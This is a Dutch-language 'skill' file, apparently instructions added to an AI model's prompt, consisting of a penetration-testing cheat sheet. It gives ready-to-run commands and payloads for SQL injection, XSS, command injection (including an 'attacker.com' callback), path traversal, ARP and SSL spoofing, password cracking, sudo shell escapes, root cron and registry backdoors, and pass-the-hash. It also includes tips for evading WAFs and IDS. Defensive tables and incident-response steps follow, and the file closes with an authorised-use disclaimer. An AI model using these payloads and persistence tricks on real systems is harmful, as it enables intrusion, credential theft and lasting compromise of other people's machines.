# Cybersecurity Skill

Je bent een cybersecurity expert. Gebruik deze kennis bij elke security-gerelateerde vraag.

---

## Reconnaissance

### Passief (geen direct contact)
```bash
# OSINT
whois domain.com
dig domain.com ANY
host -t mx domain.com
theHarvester -d domain.com -b all
shodan search "hostname:domain.com"

# Google dorks
site:domain.com filetype:pdf
site:domain.com inurl:admin
site:domain.com ext:sql | ext:db | ext:log
"index of" site:domain.com
```

### Actief (direct contact)
```bash
# Network discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -sV -sC -p- target                     # Full port scan + versions
masscan -p1-65535 target --rate=1000        # Fast port scan

# Web enumeration
nikto -h https://target
dirb https://target /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target -w wordlist.txt
ffuf -u https://target/FUZZ -w wordlist.txt
```

**Barrière**: Rate limiting, WAF, IDS/IPS, honeypots
**Bypass**: Slow scans (-T1), rotate IPs, fragment packets

---

## Web Attacks

### SQL Injection
```
# Detection
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1' ORDER BY 1--
1' UNION SELECT null--

# Exploitation
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
```

**Barrière**: Prepared statements, input validation, WAF
**Bypass**: Encoding (URL, hex, unicode), case variation, comments

### XSS (Cross-Site Scripting)
```html
# Stored/Reflected
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

# DOM-based
#<script>alert('XSS')</script>
```

**Barrière**: CSP, output encoding, HttpOnly cookies, sanitization
**Bypass**: Event handlers, SVG, encoding, polyglots

### Command Injection
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
& ping -c 1 attacker.com &
```

**Barrière**: Input validation, allowlists, escaping, sandboxing
**Bypass**: Newlines, encoding, $IFS, wildcards

### Path Traversal / LFI
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/var/log/apache2/access.log   # Log poisoning
php://filter/convert.base64-encode/resource=config.php
```

**Barrière**: Chroot, input validation, disable include
**Bypass**: Double encoding, null bytes (%00), wrapper abuse

---

## Network Attacks

### Man-in-the-Middle
```bash
# ARP Spoofing
arpspoof -i eth0 -t victim gateway
ettercap -T -M arp:remote /victim// /gateway//

# DNS Spoofing
dnsspoof -i eth0 -f hosts.txt

# SSL Strip
sslstrip -l 8080
```

**Barrière**: HSTS, certificate pinning, DNSSEC, static ARP
**Bypass**: HSTS bypass (eerste visit), compromised CA

### Password Attacks
```bash
# Online
hydra -l admin -P wordlist.txt target ssh
hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
medusa -h target -u admin -P wordlist.txt -M ssh

# Offline
john --wordlist=rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt rockyou.txt    # MD5
hashcat -m 1000 -a 0 hashes.txt rockyou.txt # NTLM
```

**Barrière**: MFA, rate limiting, account lockout, strong hashing (bcrypt/argon2)
**Bypass**: Credential stuffing, password spraying, phishing

---

## Privilege Escalation

### Linux
```bash
# Enumeration
id; whoami; uname -a
sudo -l                          # Sudo permissions
find / -perm -4000 2>/dev/null   # SUID binaries
cat /etc/crontab                 # Cron jobs
ls -la /etc/passwd /etc/shadow   # Permissions
getcap -r / 2>/dev/null          # Capabilities

# Exploits
# GTFOBins: https://gtfobins.github.io
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
```

### Windows
```powershell
# Enumeration
whoami /all
net user
systeminfo
wmic service get name,pathname,startmode
icacls "C:\Program Files"

# Exploits
# Unquoted service paths
# DLL hijacking
# Token impersonation (potato attacks)
```

**Barrière**: Least privilege, patching, remove SUID, audit sudoers
**Bypass**: Kernel exploits, misconfigs, credential reuse

---

## Post-Exploitation

### Persistence
```bash
# Linux
echo "* * * * * /tmp/shell.sh" >> /var/spool/cron/crontabs/root
echo "/tmp/backdoor &" >> /etc/rc.local

# Windows
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
schtasks /create /tn "backdoor" /tr "C:\backdoor.exe" /sc onstart
```

### Lateral Movement
```bash
# Pass the Hash
pth-winexe -U admin%hash //target cmd
impacket-psexec admin@target -hashes :hash

# SSH pivoting
ssh -D 9050 user@pivot                    # SOCKS proxy
ssh -L 8080:internal:80 user@pivot        # Local forward
proxychains nmap -sT internal_target
```

**Barrière**: Network segmentation, EDR, log monitoring, credential rotation
**Bypass**: Living off the land (LOLBins), memory-only malware

---

## Defensive Maatregelen

### Network Security
| Maatregel | Implementatie |
|-----------|--------------|
| Firewall | iptables, pf, Windows Firewall |
| IDS/IPS | Snort, Suricata, Zeek |
| Segmentatie | VLANs, microsegmentatie |
| VPN | WireGuard, OpenVPN |
| DNS filtering | Pi-hole, DNS sinkhole |

### Application Security
| Maatregel | Implementatie |
|-----------|--------------|
| WAF | ModSecurity, Cloudflare |
| Rate limiting | nginx limit_req, fail2ban |
| Input validation | Allowlists, regex, type checking |
| Output encoding | HTML entities, URL encoding |
| CSP | Content-Security-Policy header |

### Endpoint Security
| Maatregel | Implementatie |
|-----------|--------------|
| EDR | CrowdStrike, Carbon Black, Defender |
| Antivirus | Real-time scanning, heuristics |
| Hardening | CIS benchmarks, DISA STIGs |
| Patching | Automated updates, vulnerability scanning |
| Allowlisting | AppLocker, Software Restriction Policies |

---

## Incident Response

### Triage
```bash
# Linux
ps aux                           # Running processes
netstat -tulpn                   # Open connections
lsof -i                          # Network files
cat /var/log/auth.log            # Auth logs
last                             # Login history
find / -mtime -1 -type f         # Recently modified files

# Windows
tasklist /v
netstat -ano
Get-EventLog -LogName Security -Newest 100
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```

### Containment
1. Isoleer systeem (network disconnect)
2. Preserve evidence (memory dump, disk image)
3. Block IOCs (IPs, domains, hashes)
4. Reset credentials
5. Patch vulnerability

---

## Tools Quick Reference

| Doel | Tool |
|------|------|
| Port scanning | nmap, masscan, rustscan |
| Web scanning | nikto, nuclei, burpsuite |
| Directory bruteforce | gobuster, ffuf, feroxbuster |
| SQLi | sqlmap |
| Password cracking | hashcat, john |
| Exploitation | metasploit, exploitdb |
| Pivoting | chisel, ligolo, proxychains |
| C2 | sliver, havoc, cobalt strike |
| OSINT | maltego, spiderfoot, recon-ng |
| Forensics | volatility, autopsy, sleuthkit |

---

## Certificeringen Pad

```
Beginner:    CompTIA Security+ → CEH
Intermediate: OSCP → CRTP → CRTO
Advanced:    OSEP → OSED → OSEE
Blue Team:   BTL1 → CCD → GCIH
```

---

*Gebruik deze kennis alleen voor geautoriseerde tests en verdediging.*
